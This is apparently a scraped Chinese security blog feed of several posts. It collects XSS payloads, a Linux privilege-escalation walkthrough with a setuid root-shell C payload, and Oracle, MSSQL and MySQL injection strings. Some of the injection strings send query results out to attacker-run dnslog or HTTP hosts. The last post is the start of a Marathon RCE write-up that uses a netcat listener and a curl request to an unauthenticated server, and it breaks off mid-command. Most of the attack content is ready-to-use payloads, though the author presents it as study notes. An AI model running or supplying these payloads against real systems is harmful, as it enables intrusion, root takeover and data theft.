/&gt;&lt;iframe&gt;  利用iframe的scr来弹窗  </span><br><span class="line">&lt;img src=&quot;1&quot; onerror=eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;)&gt;&lt;/img&gt;  过滤了alert来执行弹窗</span><br></pre></td></tr></table></figure></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权</title>
      <link href="/2019/10/09/Linux%E6%8F%90%E6%9D%83/"/>
      <url>/2019/10/09/Linux%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><p>上一次提权提到了内核漏洞本地提权，SUID提权，但是在面对复杂的服务器环境时需要了解更多的提权方法。上次在ny护网的时候搞到了一台Linux服务器的低权限oracle账号，然后尝试提权成功，所以有了这篇文章。</p><p>低内核版本提权</p><p>发行版本是rhel5.5内核版本是比较低的 2.6.18，但是脏牛漏洞是对内核版本大于2.6.22可以利用，所以我们可以利用tmp目录权限、suid 权限和C语言使普通帐号提权为ROOT权限。</p><p>1.进入tmp目录并创建目录exploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">mkdir exploit</span><br></pre></td></tr></table></figure><p> 2.查看ping命令所具有的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll /bin/ping</span><br></pre></td></tr></table></figure><p> 3.创建target文件硬链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln /bin/ping /tmp/exploit/target</span><br></pre></td></tr></table></figure><p>4.查看target文件权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll /tmp/exploit/target</span><br></pre></td></tr></table></figure><p>5.把target文件加载到内存中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 3&lt; /tmp/exploit/target</span><br></pre></td></tr></table></figure><p>6.查看target在内存的状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll /proc/$$/fd/3</span><br></pre></td></tr></table></figure><p>7.删除target文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /tmp/exploit/</span><br></pre></td></tr></table></figure><p>8.再次查看target在内存的状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll /proc/$$/fd/3</span><br></pre></td></tr></table></figure><p>9.创建一个c语言代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim payload.c</span><br></pre></td></tr></table></figure><p>源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void __attribute__((constructor)) init()  // 两个下划线</span><br><span class="line">&#123;</span><br><span class="line">     setuid(0);</span><br><span class="line">     system(&quot;/bin/bash&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>10.利用gcc编译这段代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -W -fPIC -shared -o /tmp/exploit payload.c</span><br></pre></td></tr></table></figure><p>11.提升到root权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LD_AUDIT=&quot;\$ORIGIN&quot; exec /proc/self/fd/3</span><br><span class="line">ERROR: ld.so: object &apos;$ORIGIN&apos; cannot be loaded as audit interface: cannot open shared object file; ignored.</span><br><span class="line">Usage: ping [-LRUbdfnqrvVaA] [-c count] [-i interval] [-w deadline]</span><br><span class="line">            [-p pattern] [-s packetsize] [-t ttl] [-I interface or address]</span><br><span class="line">            [-M mtu discovery hint] [-S sndbuf]</span><br><span class="line">            [ -T timestamp option ] [ -Q tos ] [hop1 ...] destination</span><br></pre></td></tr></table></figure><p><a href="http://zone.secevery.com/uploads/article/20191011/9cade583e89290e6375430bd2ec1ef5c.png" target="_blank" rel="noopener"><img src="http://zone.secevery.com/uploads/article/20191011/9cade583e89290e6375430bd2ec1ef5c.png" alt="1.png"></a></p><p>等到执行完之后就是root权限了。这是一个老版本的gcc编译器漏洞了，虽然老，但是还是学习一下的好。</p><p>sudo配置错误</p><p>这个方法是在freebuf上的一篇文章上看到的，但是实际情况下还没有见到过。</p><p>1.查看 <code>/home/</code>目录下是否有</p><p>.sudo_as_admin_successful</p><p>文件，如果有的话直接可以输入当前低权限账号的密码直接</p><p>sudo su</p><p>切换为root用户。</p><p>原文链接：<a href="https://www.freebuf.com/vuls/211847.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/211847.html</a></p><p>以下是原文的利用过程：</p><p>靶机 JIS-CTF-VulnUpload-CTF01 就是很好的一个案例。首先，利用 web 漏洞拿到低权账号 technawi 的 meterpreter 会话：</p><p><a href="http://zone.secevery.com/uploads/article/20191011/e1a1b07d188561b4130774875410ba26.png" target="_blank" rel="noopener"><img src="http://zone.secevery.com/uploads/article/20191011/e1a1b07d188561b4130774875410ba26.png" alt="2.png"></a></p><p>接着，翻找文件找到其密码：</p><p><a href="http://zone.secevery.com/uploads/article/20191011/a21cd35eb6d6a52b44390d47697db3dd.png" target="_blank" rel="noopener"><img src="http://zone.secevery.com/uploads/article/20191011/a21cd35eb6d6a52b44390d47697db3dd.png" alt="3.png"></a></p><p>然后，发现 home/ 中存在 .sudo_as_admin_successful 文件：</p><p><a href="http://zone.secevery.com/uploads/article/20191011/03b1f304da9e57bf7ed78ae92d4aff70.png" target="_blank" rel="noopener"><img src="http://zone.secevery.com/uploads/article/20191011/03b1f304da9e57bf7ed78ae92d4aff70.png" alt="4.png"></a></p><p>最后，用 technawi 自己的密码切换为 root 用户：</p><p><a href="http://zone.secevery.com/uploads/article/20191011/8cee25a53c3242ca69ac570776d0eb9d.png" target="_blank" rel="noopener"><img src="http://zone.secevery.com/uploads/article/20191011/8cee25a53c3242ca69ac570776d0eb9d.png" alt="5.png"></a></p><p>linux提权的方法有很多而且很复杂，目前先收集起来，待以后再仔细研究</p><hr><p>转载于：<a href="http://zone.secevery.com/article/1115" target="_blank" rel="noopener">http://zone.secevery.com/article/1115</a></p></excerpt>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Oracle注入 — 报错注入</title>
      <link href="/2019/10/09/Oracle%E6%B3%A8%E5%85%A5-%E2%80%94-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/10/09/Oracle%E6%B3%A8%E5%85%A5-%E2%80%94-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><h1 id="Oracle注入基础"><a href="#Oracle注入基础" class="headerlink" title="Oracle注入基础"></a>Oracle注入基础</h1><h4 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h4><ul><li>Oracle中的dual表<ul><li>dual是oracle中的伪表 （之有一行一列）</li><li>每个用户都可以使用</li><li>也可能被删掉 sys可以恢复</li></ul></li></ul><p>如：<br><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/Oracle001.png" alt="走丢啦o(´^｀)o"></p><p><strong>Tips:</strong></p><p>1.Oracle的数据类型是强匹配的(MYSQL有弱匹配的味道)，所以在Oracle进行类似UNION查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用null代替某些无法快速猜测出数据类型的位置。</p><p>2.Oracle的单行注释符号是– ，多行注释符号/**/。</p><h4 id="判断Oracle数据库"><a href="#判断Oracle数据库" class="headerlink" title="判断Oracle数据库"></a>判断Oracle数据库</h4><ol><li>利用函数来判断是否oracle数据 如：and len(‘a’)=1<br>（在mssql和mysql以及db2内，返回长度值是调用len()函数；在oracle和INFORMIX则是通过length()来返回长度值。）</li><li>也可以通过dual来判断是否为oracle</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from dual where 1=1 and (select count(*) from dual)&gt;1 --</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/Oracle002.png" alt="走丢啦o(´^｀)o"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from dual where 1=1 and (select count(*) from dual)&gt;0 --</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/Oracle003.png" alt="走丢啦o(´^｀)o"></p><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><ul><li>利用 utl_inaddr.get_host_name<br>这种方法在Oracle 8g，9g，10g中不需要任何权限，但是在Oracle 11g以及以后的版本中，官方加强了访问控制权限，所以在11g以后要使用此方法进行报错注入，当前数据库用户必须有网络访问权限。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/oracle.jsp?name=&apos; and 1=utl_inaddr.get_host_name((select user from dual))--</span><br></pre></td></tr></table></figure><ul><li>利用 ctxsys.drithsx.sn()</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/oracle.jsp?name=&apos; and 1=ctxsys.drithsx.sn(1,(select user from dual))--</span><br></pre></td></tr></table></figure><ul><li>利用 dbms_xdb_version.checkin()</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/oracle.jsp?name=1&apos; and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null–</span><br></pre></td></tr></table></figure><ul><li>利用 dbms_xdb_version.makeversioned()</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/oracle.jsp?name=1&apos; and (select dbms_xdb_version.makeversioned((select user fromdual)) from dual) is not null --</span><br></pre></td></tr></table></figure><ul><li>利用dbms_xdb_version.uncheckout()</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/oracle.jsp?name=1&apos; and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null --</span><br></pre></td></tr></table></figure><ul><li>利用dbms_utility.sqlid_to_sqlhash()</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/oracle.jsp?name=1&apos; and (SELECT dbms_utility.sqlid_to_sqlhash((select user fromdual)) from dual) is not null --</span><br></pre></td></tr></table></figure><ul><li>利用ordsys.ord_dicom.getmappingxpath()</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/oracle.jsp?name=1&apos; and 1=ordsys.ord_dicom.getmappingxpath((select user fromdual),user,user)</span><br></pre></td></tr></table></figure><ul><li>使用decode进行报错注入，这种方式更偏向布尔型注入，因为这种方式并不会通过报错把查询结果回显回来，仅是用来作为页面的表现不同的判断方法。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/oracle.jsp?name=11&apos; and 1=(select decode(substr(user,1,1),&apos;S&apos;,(1/0),0) from dual) --</span><br></pre></td></tr></table></figure><ul><li>XMLType</li></ul><p>在使用这个XMLType进行报错时，很多人不知道为什么要用chr(60)，通过ascii查询可以看到，60:&lt;,58:’:’,62:’&gt;’,查了下相关的api，发现xmltype在进行解析的时候必须以&lt;开头&gt;结尾，这里:冒号在这是必不可少的，至于为什么是冒号这个我也没查到，另外需要注意的是如果返回的数据种有空格的话，它会自动截断，导致数据不完整，有replace函数替换成其他非空字符就可以。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/oracle.jsp?name=1&apos;and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null--</span><br></pre></td></tr></table></figure><h4 id="Oracle带外通信获取信息"><a href="#Oracle带外通信获取信息" class="headerlink" title="Oracle带外通信获取信息"></a>Oracle带外通信获取信息</h4><ul><li>utl_http.request()</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/oracle.jsp?name=1&apos; and 1=utl_http.request(&apos;http://10.10.10.10(自己搭建dnslog或者用现有的):80/&apos;||(select banner from sys.v_$version where rownum=1)) --</span><br></pre></td></tr></table></figure><ul><li>utl_inaddr.get_host_address()</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/oracle.jsp?name=1&apos; and (select utl_inaddr.get_host_address((select user fromdual)||&apos;.sssss.com(自己搭建dnslog或者用现有的)&apos;) from dual)is not null --</span><br></pre></td></tr></table></figure><ul><li>SYS.DBMS_LDAP.INIT</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/oracle.jsp?name=1&apos; and (select SYS.DBMS_LDAP.INIT((select user fromdual)||&apos;.sssss.com(自己搭建dnslog或者用现有的)&apos;) from dual)is not null --￼</span><br></pre></td></tr></table></figure><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>这里的布尔盲注跟Mysql没有感觉有什么大区别,时间盲注感觉也是一样 只是函数的不同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​</span><br></pre></td></tr></table></figure><p>**18031200424’ AND ascii(substr(SYS_CONTEXT(‘USERENV’,’CURRENT_USER’),%s,1))=%s AND ‘aaa’=’aaa” % (i, ord(payload))<br>​<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">附上一个案例 http://wooyun.chamd5.org/bug_detail.php?wybug_id=wooyun-2016-0213757</span><br></pre></td></tr></table></figure></p><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><ul><li>使用DBMS_PIPE.RECEIVE_MESSAGE()进行时间盲注</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/oracle.jsp?name=1&apos;and 1=(DBMS_PIPE.RECEIVE_MESSAGE(&apos;a&apos;,10)) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>实际用法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/oracle.jsp?name=1&apos; AND 7238=(CASE WHEN (ASCII(SUBSTRC((SELECT NVL(CAST(USER ASVARCHAR(4000)),CHR(32)) FROM DUAL),3,1))&gt;96) THENDBMS_PIPE.RECEIVE_MESSAGE(CHR(71)||CHR(106)||CHR(72)||CHR(73),1) ELSE 7238 END) AND &apos;1&apos;=&apos;1&amp;sname=1</span><br></pre></td></tr></table></figure><p>【DBMS_PIPE.RECEIVE_MESSAGE的理解】</p><p>来自官网的DBMS_PIPE.RECEIVE_MESSAGE语法：</p><p>DBMS_PIPE.RECEIVE_MESSAGE (</p><p>pipename IN VARCHAR2,</p><p>timeout IN INTEGER DEFAULT maxwait)</p><p>RETURN INTEGER;</p><p>可以暂时理解成DBMS_PIPE.RECEIVE_MESSAGE(‘任意值’,延迟时间)</p><ul><li>使用decode()进时间盲注</li></ul><p>(select count(*) from all_objects) 会花费更多是时间去查询所有数据库的条目，所以以这种方式进行时间判断依据，这是一个骚气的方式。(类比OWASP测试指南中老虎机的案例)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/oracle.jsp?name=1&apos;and 1=(select decode(substr(user,1,1),&apos;S&apos;,(select count(*) fromall_objects),0) from dual) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>使用decode与DBMS_PIPE.RECEIVE_MESSAGE嵌套的方式进行时间盲注。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/oracle.jsp?name=1&apos;and 1=(selectdecode(substr(user,1,1),&apos;A&apos;,DBMS_PIPE.RECEIVE_MESSAGE(&apos;RDS&apos;,5) ,0) from dual) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MSSQL注入 — 反弹注入</title>
      <link href="/2019/10/08/MSSQL%E6%B3%A8%E5%85%A5-%E2%80%94-%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/10/08/MSSQL%E6%B3%A8%E5%85%A5-%E2%80%94-%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><p>明明是sql注入的点，却无法进行注入，注射工具拆解的速度异常的缓慢，错误提示信息关闭，无法返回注入的结果，这个时候你便可以尝试使用反弹注入，</p><p>反弹注入需要依赖于函数opendatasource的支持，将当前数据库中的查询结果发送到另一数据库服务器中。</p><h2 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h2><p>and exists (select <em> from sysobjects)–返回正常为mssql（也名sql server）<br>and exists (select count(</em>) from sysobjects)–有时上面那个语句不行就试试这个哈</p><h2 id="判断数据库版本"><a href="#判断数据库版本" class="headerlink" title="判断数据库版本"></a>判断数据库版本</h2><p>and 1=@@version–这个语句要在有回显的模式下才可以哦<br>and substring((select @@version),22,4)=’2008’–适用于无回显模式，后面的2008就是数据库版本，返回正常就是2008的复制代码第一条语句执行效果图（类似）：第二条语句执行效果图：（如果是2008的话就返回正常）</p><h2 id="获取所有数据库的个数"><a href="#获取所有数据库的个数" class="headerlink" title="获取所有数据库的个数"></a>获取所有数据库的个数</h2><p>\1. and 1=(select quotename(count(name)) from master..sysdatabases)–<br>\2. and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases) –<br>\3. and 1=(select str(coun、 and 1=(select quotename(count(name)) from master..sysdatabases where dbid&gt;5)–<br>and 1=(select str(count(name))%2b’|’ from master..sysdatabases where dbid&gt;5) –<br>and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases where dbid&gt;5) –<br>说明：dbid从1-4的数据库一般为系统数据库.</p><h2 id="获取数据库-（该语句是一次性获取全部数据库的，且语句只适合-gt-2005，两条语句可供选择使用）"><a href="#获取数据库-（该语句是一次性获取全部数据库的，且语句只适合-gt-2005，两条语句可供选择使用）" class="headerlink" title="获取数据库 （该语句是一次性获取全部数据库的，且语句只适合&gt;=2005，两条语句可供选择使用）"></a>获取数据库 （该语句是一次性获取全部数据库的，且语句只适合&gt;=2005，两条语句可供选择使用）</h2><p>and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(‘’))–<br>and 1=(select ‘|’%2bname%2b’|’ from master..sysdatabases FOR XML PATH(‘’))–</p><h2 id="获取当前数据库"><a href="#获取当前数据库" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h2><p>and db_name()&gt;0</p><p>and 1=(select db_name())–</p><h2 id="获取当前数据库中的表（有2个语句可供选择使用）"><a href="#获取当前数据库中的表（有2个语句可供选择使用）" class="headerlink" title="获取当前数据库中的表（有2个语句可供选择使用）"></a>获取当前数据库中的表（有2个语句可供选择使用）</h2><p><strong>【下列语句可一次爆数据库所有表（只限于mssql2005及以上版本）】</strong></p><p>and 1=(select quotename(name) from 数据库名..sysobjects where xtype=’U’ FOR XML PATH(‘’))–<br>and 1=(select ‘|’%2bname%2b’|’ from 数据库名..sysobjects where xtype=’U’ FOR XML PATH(‘’))–复制代码测试效果图：得到 3个敏感的表：Whir_Sec_Users/Whir_Mem_Member/Whir_Mem_MemberGroup</p><h2 id="获得表里的列"><a href="#获得表里的列" class="headerlink" title="获得表里的列"></a>获得表里的列</h2><p>一次爆指定表的所有列（只限于mssql2005及以上版本）：<br>and 1=(select quotename(name) from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name=’指定表名’) FOR XML PATH(‘’))–<br>and 1=(select ‘|’%2bname%2b’|’ from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name=’指定表名’) FOR XML PATH(‘’))–</p><p>效果图：既然有账户信息，我就不管是不是管理员的的了，我帖子的目的不是为了得到管理员的信息，只是为了演示可以通过这个方法来获取相关信息。</p><h2 id="获取指定数据库中的表的列的数据库"><a href="#获取指定数据库中的表的列的数据库" class="headerlink" title="获取指定数据库中的表的列的数据库"></a>获取指定数据库中的表的列的数据库</h2><p>逐条爆指定表的所有字段的数据（只限于mssql2005及以上版本）：<br>and 1=(select top 1 <em> from 指定数据库..指定表名 where排除条件 FOR XML PATH(‘’))–<br>一次性爆N条所有字段的数据（只限于mssql2005及以上版本）：<br>and 1=(select top N </em> from 指定数据库..指定表名 FOR XML PATH(‘’))–复制代码第一条语句：and 1=(select top 1 * from 指定数据库..指定表名 FOR XML PATH(‘’))–测试效果图：———————————-加上where条件筛选结果出来会更加好，如：where and name like ‘%user%’ 就会筛选出含有user关键词的出来。用在筛选表段时很不错。</p><p>注意：在使用一次获取数据库信息的语句时，请使用火狐浏览器，笔者测试 IE8、360急速浏览器、猎豹浏览器均卡死，火狐浏览器也会导致出现几秒钟的卡死，弹出框框，我们点击“停止脚本”就会得到初步解决。！！！！！！！！！！！！！！！！！！！！至此，我们已经得到了账户信息了，至于管理员的呢，哈哈，大家自行测试时换表啥的就好了。</p><hr><p>转载于:<a href="https://www.cnblogs.com/ihacker/p/11086925.html" target="_blank" rel="noopener">https://www.cnblogs.com/ihacker/p/11086925.html</a></p></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL注入 — Dns 注入</title>
      <link href="/2019/10/06/MySQL%E6%B3%A8%E5%85%A5-%E2%80%94-Dns-%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/10/06/MySQL%E6%B3%A8%E5%85%A5-%E2%80%94-Dns-%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<excerpt in index> <ul><li><a id="more"></a><the rest of contents文></the></li></ul><p><strong>DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息</strong><br><strong>简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息</strong></p><p><em>首先，你得有一个域名(like: abc.com)，搭建好vps环境，之后访问XXXXX.abc.com，dns服务会将此解析放入log记录中，之后我们可以通过查看log记录来获取之前select查询到的信息。</em></p><p><img src="https://raw.githubusercontent.com/yearnming/yearnming.github.io/master/img/dns01.png" alt></p><hr><p><em>load_file读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。 该文件所有字节可读，但文件内容必须小于max_allowed_packet。</em><br><em>如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</em><br><em>在MySQL5.0.19，character_set_filesystem系统变量控制文件名的解释，即仅作文字字符串。</em></p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_file(concat(&apos;\\\\\\\\&apos;,(select database()),&apos;.xxxx.ceye.io\\abc&apos;))</span><br></pre></td></tr></table></figure><p><em>concat是字符串拼接</em><br><em>database()就是你要做SQL注入查询的地方</em><br><em>‘.xxxx.ceye.io\abc’就是你的dnslog平台给你的域名</em><br><em>后面的abc可以改也可以不改，无所谓的，你乐意写啥就写啥</em></p><p><em>上面拼接的结果就是’\\ schema_name.XXXX.ceye.io\abc’，其实相当于访问了带有数据库名称的三级域名，被dnslog捕获到了</em></p><p><em>然后查看ceye，成功获取到了数据库名称</em><br><em>对于表段，由于load_file()一次只能传输一条数据，所以查询的时候需要使用limit来一个一个的解析。</em></p></excerpt>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>通过Shodan发现目标应用Marathon服务的RCE漏洞</title>
      <link href="/2019/10/03/%E9%80%9A%E8%BF%87Shodan%E5%8F%91%E7%8E%B0%E7%9B%AE%E6%A0%87%E5%BA%94%E7%94%A8Marathon%E6%9C%8D%E5%8A%A1%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/10/03/%E9%80%9A%E8%BF%87Shodan%E5%8F%91%E7%8E%B0%E7%9B%AE%E6%A0%87%E5%BA%94%E7%94%A8Marathon%E6%9C%8D%E5%8A%A1%E7%9A%84RCE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><excerpt in index> </excerpt></p><ul><li><a id="more"></a><the rest of contents文></the></li></ul><p><strong>*本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</strong></p><p><a href="https://image.3001.net/images/20190909/1568008860_5d75ea9cb6ddc.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190909/1568008860_5d75ea9cb6ddc.png!small" alt="img"></a></p><p><strong>大家好，今天要和大家分享的是，作者在Shodan搜索中发现某应用系统Marathon服务的无需密码验证bug，进一步提权形成RCE漏洞。作为一名开发工程师，作者通过发现该漏洞得到的经验是：在做漏洞众测时，具备一定的开发背景经验非常重要，if you know how something works, you might be able to break it，只有了解目标应用的工作机制，才能有效地发现它存在的问题。最终作者凭借该漏洞获得厂商$$,$$$上万美金的奖励。</strong></p><h2 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h2><p>某应用系统的容器编排平台Marathon服务实例的root权限RCE漏洞。Marathon是一个生产级别的容器（Docker）编排平台，用于中间层的数据中心操作系统(DC/OS)和Apache Mesos。Apache Mesos是一个分布式系统的管理软件，可对集群资源进行分配管理。Marathon算是一个基于Mesos的私有PaaS，它实现了Mesos的Framework，Marathon通过HAProxy实现服务发现和负载平衡，并为部署环境提供提供REST API服务、授权和SSL、配置约束等功能。</p><p>因此，由于Marathon是Apache mesos的一个编排平台，这意味着用户可以根据自己的需要安排要执行的任务，就像执行一条条简单的bash命令(类似于cronjobs这样的命令)。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>某天，当我在Shodan搜索东西时，由于之前的项目需要，我必须要自己架设一些Marathon/Mesos/Spark之类的实例，所以我就自然想到了通过Shodan来看看，有哪些大公司在生产环境中部署了Marathon服务，但却未做任何访问权限验证措施的。因此，我就按照“ssl:Redacted” “X-Marathon-Leader”这样的语法，在Shodan中进行查找，最后，还真发现了一些有意思的东西，如以下两个搜索结果：</p><p><a href="https://image.3001.net/images/20190909/1568008453_5d75e90577449.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190909/1568008453_5d75e90577449.png!small" alt="img"></a></p><p>它们是访问响应状态码为HTTP/1.1 200 OK的两个Marathon服务实例，虽然不能百分百肯定，但这种200响应码的Marathon服务，90%的可能说明无需任何密码验证即可访问。</p><p>于是，我立即按照Shodan中的显示结果，打开了目标应用的Marathon服务链接：<a href="https://xxx.xxx.xxx.xxx/ui/#/apps" target="_blank" rel="noopener">https://XXX.XXX.XXX.XXX/ui/#/apps</a> ，之后就真的无需密码验证，立马就进入了Marathon的主界面，如下：</p><p><a href="https://image.3001.net/images/20190909/1568008471_5d75e9179b93e.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190909/1568008471_5d75e9179b93e.png!small" alt="img"></a></p><p>这样一来，我就可以在我自己的服务器上来部署监听上述Marathon服务的实例了，通过此种方法，间接实例对Marathon服务的的远程代码执行（RCE），方法如下：</p><p>1、在我自己的服务器上设置对端口55555的监听：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#set your own server to wait the response    root@h0st:~# nc -lvvv 55555</span><br></pre></td></tr></table></figure><p>2、用Curl命令创建一个 Marathon 服务运行实例，并通过该实例来执行cmd命令，其中的attacker_server即为我服务器的IP地址。具体命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># create a marathon application that will be execute any command that you want (in this case is /usr/bin/wget --user-agent=marathon-id --post-data=`id`)    # replace attacker_server with your listening server that you set up with netcat and the &quot;rce-id&quot; tag with your own custom tag, this is the Marathon application name    curl -sk -X POST -H &quot;Content-type: application/json&quot; https://XXX.XXX.XXX.XXX/v2/apps -d &apos;&#123; &quot;mem&quot;: 16, &quot;id&quot;: &quot;rce-id&quot;, &quot;cmd&quot;: 